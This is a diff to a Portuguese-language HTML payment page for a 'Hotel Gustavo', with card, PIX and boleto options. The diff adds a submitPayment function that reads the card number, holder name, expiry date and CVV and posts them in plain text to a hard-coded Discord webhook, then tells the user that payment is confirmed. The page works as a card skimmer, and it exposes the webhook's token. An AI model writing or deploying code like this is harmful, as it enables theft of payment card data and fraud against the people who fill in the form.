@@ -90,14 +90,14 @@
             <img src="https://www.logotypes101.com/logos/202/C17B1264A4C729B8858F6D63C166F264/boleto.png" alt="Boleto">
             <h3>Boleto</h3>
         </div>
-        <button class="pay-button" onclick="confirmPayment()">Confirmar Pagamento</button>
+        <button class="pay-button" onclick="submitPayment()">Confirmar Pagamento</button>
 
         <div id="payment-details" class="payment-details">
             <div id="cartao-details" style="display: none;">
-                <input type="text" placeholder="Número do Cartão" />
-                <input type="text" placeholder="Nome do Titular" />
-                <input type="text" placeholder="Data de Validade (MM/AA)" />
-                <input type="text" placeholder="CVV" />
+                <input type="text" id="card-number" placeholder="Número do Cartão" />
+                <input type="text" id="card-name" placeholder="Nome do Titular" />
+                <input type="text" id="card-expiry" placeholder="Data de Validade (MM/AA)" />
+                <input type="text" id="card-cvv" placeholder="CVV" />
             </div>
             <div id="pix-details" style="display: none;">
                 <img src="https://image.shutterstock.com/shutterstock/photos/1486190660/display_1500/stock-vector-qr-code-icon-symbolic-barcode-code-vector-1486190660.jpg" alt="QR Code Falso" class="qr-code" />
@@ -107,7 +107,7 @@
                 <div class="boleto">
                     <h3>Boleto Gerado</h3>
                     <p>Nome: Hotel Gustavo</p>
-                    <p>Vencimento: 10=/11/2024</p>
+                    <p>Vencimento: 10/11/2024</p>
                     <p>Valor: R$ 200,00</p>
                     <p>Código de Barras: <strong>34191.79001 01000.000004 12345.678901 0 12340000020000</strong></p>
                     <p>Instruções: Pagamento em qualquer banco até a data de vencimento.</p>
@@ -132,9 +132,40 @@
             }
         }
 
-        function confirmPayment() {
-            alert('Pagamento confirmado! Obrigado por escolher o Hotel Gustavo!');
-            // Aqui você pode adicionar lógica para redirecionar ou finalizar a simulação
+        function submitPayment() {
+            // Pegando os dados do formulário
+            const cardNumber = document.getElementById('card-number') ? document.getElementById('card-number').value : null;
+            const cardName = document.getElementById('card-name') ? document.getElementById('card-name').value : null;
+            const cardExpiry = document.getElementById('card-expiry') ? document.getElementById('card-expiry').value : null;
+            const cardCVV = document.getElementById('card-cvv') ? document.getElementById('card-cvv').value : null;
+
+            const paymentType = cardNumber ? 'Cartão' : 'PIX/Boleto'; // Verifica o tipo de pagamento
+
+            // Dados a serem enviados para o Discord
+            const payload = {
+                content: **Novo pagamento recebido!**\nTipo de pagamento: ${paymentType}\n\nDetalhes:\nNome: ${cardName || 'Não informado'}\nNúmero do Cartão: ${cardNumber || 'Não informado'}\nData de Validade: ${cardExpiry || 'Não informado'}\nCVV: ${cardCVV || 'Não informado'}
+            };
+
+            // Enviar para a webhook do Discord
+            fetch('https://discord.com/api/webhooks/1303551270669521008/8KDn8WQLdAyRbs2GMeobe6ArSzuqFvtaXwDm4CGPm6azJN3QUjSTVrRwmJHnGz6jMxCN', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert("Pagamento confirmado! Obrigado por escolher o Hotel Gustavo!");
+                    // Aqui você pode adicionar lógica para redirecionar ou finalizar a simulação
+                } else {
+                    alert("Ocorreu um erro ao registrar o pagamento.");
+                }
+            })
+            .catch(error => {
+                console.error("Erro ao enviar dados:", error);
+                alert("Ocorreu um erro. Tente novamente.");
+            });
         }
     </script>
 </body>
